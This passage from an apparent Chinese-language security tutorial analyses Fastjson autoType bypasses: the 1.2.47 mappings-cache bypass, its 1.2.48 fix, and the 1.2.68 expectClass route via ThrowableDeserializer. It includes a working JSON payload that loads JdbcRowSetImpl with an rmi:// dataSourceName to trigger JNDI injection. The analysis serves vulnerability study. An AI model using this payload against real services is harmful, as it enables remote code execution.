<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此在后续会将我们传入的类名以及对应的类会被放入 <code>com.alibaba.fastjson.util.TypeUtils#mappings</code> 中。（由于 <code>com.alibaba.fastjson.parser.ParserConfig#defaultClassLoader</code> 默认为 <code>null</code>，因此通常走的是下面这个分支）</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6) 退而求其次：使用当前线程的 ContextClassLoader（TCCL）</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="keyword">if</span>(contextClassLoader != <span class="literal">null</span> &amp;&amp; contextClassLoader != classLoader)&#123;</span><br><span class="line">    clazz = contextClassLoader.loadClass(className);</span><br><span class="line">    <span class="comment">// 同样受 cache 参数控制是否写入 mappings</span></span><br><span class="line">    <span class="keyword">if</span> (cache) &#123;</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>由于我们已经在 <code>com.alibaba.fastjson.util.TypeUtils#mappings</code> 中放入了我们要加载的 <code>com.sun.rowset.JdbcRowSetImpl</code>，因此我们可以通过构造下面这个 payload 使得后续再加载 <code>com.sun.rowset.JdbcRowSetImpl</code> 完成利用。</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.lang.Class&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;bbb&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>加载 <code>com.sun.rowset.JdbcRowSetImpl</code> 时会调用 <code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType</code> 进行检测，该函数关于 <code>com.alibaba.fastjson.util.TypeUtils#mappings</code> 存在绕过问题。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 核心问题是“先命中缓存/反序列化器就 return”导致黑/白名单被绕过。</span></span><br><span class="line"><span class="comment">// 另有一处“黑名单命中仅在 mappings 无缓存时才抛异常”的条件，造成配合缓存写入即可通杀。</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">// 1) 基本入参校验：类型名为空直接返回 null</span></span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 类型名长度限制（&lt;3 或 ≥128 直接拒绝）</span></span><br><span class="line">    <span class="keyword">if</span> (typeName.length() &gt;= <span class="number">128</span> || typeName.length() &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 标准化：将内部类分隔符 &#x27;$&#x27; 替换为 &#x27;.&#x27;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) FNV-1a 风格的滚动哈希常量</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) h1：用于快速检测首字符模式（如数组/签名形式）</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h1</span> <span class="operator">=</span> (BASIC ^ className.charAt(<span class="number">0</span>)) * PRIME;</span><br><span class="line">    <span class="keyword">if</span> (h1 == <span class="number">0xaf64164c86024f1aL</span>) &#123; <span class="comment">// &#x27;[&#x27; 的哈希（数组类型，例如 &quot;[Ljava.lang.String;&quot;)</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 检查 &quot;L...;&quot; 这种签名形式（形如 JVM 描述符），直接拒绝</span></span><br><span class="line">    <span class="keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="number">1</span>)) * PRIME == <span class="number">0x9198507b5af98f0L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 预计算前三个字符的滚动哈希起点，后续在循环中滚动累加</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">h3</span> <span class="operator">=</span> (((((BASIC ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(<span class="number">2</span>))</span><br><span class="line">            * PRIME;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 8) 若全局 autoTypeSupport 开启，或存在期望类型（expectClass ≠ null），</span></span><br><span class="line">    <span class="comment">//    先跑一轮“白名单→黑名单”的哈希匹配。</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">            hash ^= className.charAt(i);</span><br><span class="line">            hash *= PRIME;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8.1 命中白名单：尝试加载类（cache=false 不写入 mappings），成功即返回</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> clazz; <span class="comment">// ✅ 白名单直接放行</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 8.2 命中黑名单：仅当 mappings 中“没有该类缓存”时才抛异常</span></span><br><span class="line">            <span class="comment">// 【漏洞点#1】黑名单 + (mappings==null) 才抛；若攻击者先把类名写进 mappings，就不会抛异常</span></span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 否则继续循环（未立即拒绝）</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 9) 尝试从全局缓存 mappings 取类</span></span><br><span class="line">    <span class="comment">// 【漏洞点#2】【关键短路】若此处取到类，后面的黑/白名单检查都不会再执行（见下方 return 流程）</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 10) 尝试从已注册的反序列化器表 deserializers 中查类名（很多常见类型预置在这里）</span></span><br><span class="line">    <span class="comment">//     例如 Class.class 在初始化期就会放进 deserializers；命中则也会短路</span></span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 11) 一旦在 9/10 步找到 clazz，先做期望类型校验，然后“直接返回”</span></span><br><span class="line">    <span class="comment">//     【漏洞点#3】这就是“缓存/反序列化器优先”的致命短路：绕开了后续对 deny/accept 的严格检查</span></span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">                &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">                &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> clazz; <span class="comment">// ✅ 提前返回 → 后面的黑/白名单逻辑不会再执行</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先如果我们加载的类出现在黑名单中，则如果这个类同时也出现在 <code>mappings</code> 中，则不会报错。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 8.2 命中黑名单：仅当 mappings 中“没有该类缓存”时才抛异常</span></span><br><span class="line"><span class="comment">// 【漏洞点#1】黑名单 + (mappings==null) 才抛；若攻击者先把类名写进 mappings，就不会抛异常</span></span><br><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后在通过黑名单检测后，调用 <code>com.alibaba.fastjson.util.TypeUtils#getClassFromMapping</code> 获取 <code>typename</code> 对应的类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 9) 尝试从全局缓存 mappings 取类</span></span><br><span class="line"><span class="comment">// 【漏洞点#2】【关键短路】若此处取到类，后面的黑/白名单检查都不会再执行（见下方 return 流程）</span></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>getClassFromMapping</code> 实际上就是从 <code>mappings</code> 中获取类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className)&#123;</span><br><span class="line">    <span class="keyword">return</span> mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后查询到的类会被正常返回，至此绕过了黑名单的检测。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 11) 一旦在 9/10 步找到 clazz，先做期望类型校验，然后“直接返回”</span></span><br><span class="line"><span class="comment">//     【漏洞点#3】这就是“缓存/反序列化器优先”的致命短路：绕开了后续对 deny/accept 的严格检查</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> clazz; <span class="comment">// ✅ 提前返回 → 后面的黑/白名单逻辑不会再执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<hr>
<p>官方在 1.2.48 对该漏洞进行了修复：</p>
<ul>
<li><p>在 <code>MiscCodec</code> 处理 Class 类的地方，设置了<code>cache</code> 为 <code>false</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class.class) &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader(), <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="keyword">return</span> loadClass(className, classLoader, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="expectClass-绕过（1-2-68）"><a href="#expectClass-绕过（1-2-68）" class="headerlink" title="expectClass 绕过（1.2.68）"></a>expectClass 绕过（1.2.68）</h3><p>在 <code>checkAutoType()</code> 函数中有这样的逻辑：如果函数有 <code>expectClass</code> 入参，且我们传入的类名是 <code>expectClass</code> 的子类或实现，并且不在黑名单中，就可以通过 <code>checkAutoType()</code> 的安全检测。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果已经根据前面的映射/白名单/加载流程拿到了要使用的 Class（clazz 非空）</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若调用方提供了“期望类型”（expectClass），并且：</span></span><br><span class="line">    <span class="comment">// 1) 本次实际解析出来的类型不是 HashMap（HashMap 被当作通用容器，放宽校验）</span></span><br><span class="line">    <span class="comment">// 2) 且 实际类型 clazz 并不是 期望类型 expectClass 的子类/实现（即两者不兼容）</span></span><br><span class="line">    <span class="comment">//    —— 注意：A.isAssignableFrom(B) 为 true 表示 “B 可以赋值给 A”，也就是 B 是 A 的子类/实现</span></span><br><span class="line">    <span class="comment">//    —— 这里取反（!isAssignableFrom）表示“不兼容”，需要拦截</span></span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="literal">null</span></span><br><span class="line">            &amp;&amp; clazz != java.util.HashMap.class</span><br><span class="line">            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="comment">// 类型不匹配，直接抛出异常，给出实际类型和期望类型的提示</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 能走到这里，说明：</span></span><br><span class="line">    <span class="comment">// - 没有期望类型，或</span></span><br><span class="line">    <span class="comment">// - ✅有期望类型且兼容（clazz 是 expectClass 的子类/实现），或</span></span><br><span class="line">    <span class="comment">// - 虽不兼容但 clazz 是 HashMap（作为通用容器被放过）</span></span><br><span class="line">    <span class="comment">// 满足任一条件都返回解析得到的 Class</span></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>1.2.69 版本开始用一个白名单限制 <code>expectClass</code> 的范围：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">boolean</span> expectClassFlag;</span><br><span class="line"><span class="keyword">if</span> (expectClass == <span class="literal">null</span>) &#123;</span><br><span class="line">    expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">expectHash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(expectClass.getName());</span><br><span class="line">    <span class="keyword">if</span> (expectHash == <span class="number">0x90a25f5baa21529eL</span></span><br><span class="line">            || expectHash == <span class="number">0x2d10a5801b9d6136L</span></span><br><span class="line">            || expectHash == <span class="number">0xaf586a571e302c6bL</span></span><br><span class="line">            || expectHash == <span class="number">0xed007300a7b227c6L</span></span><br><span class="line">            || expectHash == <span class="number">0x295c4605fd1eaa95L</span></span><br><span class="line">            || expectHash == <span class="number">0x47ef269aadc650b4L</span></span><br><span class="line">            || expectHash == <span class="number">0x6439c4dff712ae8bL</span></span><br><span class="line">            || expectHash == <span class="number">0xe3dd9875a2dc5283L</span></span><br><span class="line">            || expectHash == <span class="number">0xe2a8ddba03e69e0dL</span></span><br><span class="line">            || expectHash == <span class="number">0xd734ceb4c3e9d1daL</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        expectClassFlag = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        expectClassFlag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>expectClass</code> 不在上述白名单范围则 <code>expectClassFlag = true</code>，同样会接受黑名单校验：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((!internalWhite) &amp;&amp; (autoTypeSupport || expectClassFlag)) &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> h3;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">3</span>; i &lt; className.length(); ++i) &#123;</span><br><span class="line">        hash ^= className.charAt(i);</span><br><span class="line">        hash *= PRIME;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, hash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (Arrays.binarySearch(denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Arrays.binarySearch(acceptHashCodes, fullHash) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>接下来我们找一下调用 <code>checkAutoType()</code> 且 <code>expectClass</code> 可控的方法，最终找到了以下几个类：</p>
<ul>
<li><code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze()</code></li>
<li><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze()</code></li>
</ul>
<h4 id="ThrowableDeserializer"><a href="#ThrowableDeserializer" class="headerlink" title="ThrowableDeserializer"></a>ThrowableDeserializer</h4><p><code>ThrowableDeserializer#deserialze()</code> 方法直接将 <code>@type</code> 后的类传入 <code>checkAutoType()</code> ，并且 <code>expectClass</code> 为 <code>Throwable.class</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果当前解析到的 key 就是 Fastjson 约定的类型标记 &quot;@type&quot;</span></span><br><span class="line"><span class="keyword">if</span> (JSON.DEFAULT_TYPE_KEY.equals(key)) &#123;</span><br><span class="line">    <span class="comment">// 期望 &quot;@type&quot; 的值必须是一个“字符串字面量”（类的全限定名）</span></span><br><span class="line">    <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;</span><br><span class="line">        <span class="comment">// 读取该字符串，得到“异常子类”的类名</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">exClassName</span> <span class="operator">=</span> lexer.stringVal();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键点：带着“期望类 = Throwable.class”去做 autoType 检查与加载</span></span><br><span class="line">        <span class="comment">// 这会调用 ParserConfig#checkAutoType(exClassName, Throwable.class, features)</span></span><br><span class="line">        <span class="comment">// 只要 exClassName 对应的类是 Throwable 的“子类/实现”，且不在黑名单，</span></span><br><span class="line">        <span class="comment">// 就可能在 checkAutoType 的 expectClass 分支被“放行”并返回 Class。</span></span><br><span class="line">        exClass = parser.getConfig().checkAutoType(</span><br><span class="line">            exClassName,                      <span class="comment">// 被解析出来的类名</span></span><br><span class="line">            Throwable.class,                  <span class="comment">// ★ 期望类（expectClass）= Throwable</span></span><br><span class="line">            lexer.getFeatures()               <span class="comment">// 解析特性位（含 SafeMode / SupportAutoType 等）</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果 &quot;@type&quot; 的值不是字符串，语法不合法，直接抛错</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;syntax error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 